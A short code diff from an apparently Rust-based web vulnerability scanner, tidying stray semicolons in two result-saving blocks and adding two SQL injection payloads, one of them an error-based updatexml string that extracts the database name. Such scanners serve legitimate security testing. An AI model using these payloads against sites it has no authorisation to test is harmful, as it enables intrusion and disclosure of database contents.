@@ -55,7 +55,7 @@ impl Scan for Sql {
                 res_vulns.push(v.to_string());
             }
         });
-        if !res_vulns.is_empty() { ;
+        if !res_vulns.is_empty() {
             tofile::vuln_save_to_file("vulns.txt",&res_vulns)?;
         }
         Ok(())
@@ -77,7 +77,7 @@ impl Scan for FileRead {
                 res_vulns.push(v.to_string());
             }
         });
-        if !res_vulns.is_empty() { ;
+        if !res_vulns.is_empty() {
             tofile::vuln_save_to_file("vulns.txt",&res_vulns)?;
         }
         Ok(())
@@ -144,6 +144,8 @@ pub async fn vulnmain(threads:usize,client: Client,urls:Vec<String>) -> Result<(
     ];
     let sql_payloads = vec![
         "'\" AND 78786=78678 --+a".to_string(),
+        "1 AND 78786=78678 --+a".to_string(),
+        "1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)#".to_string(),
         "'\"1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)#".to_string(),
     ];
     let file_read_payloads = vec![
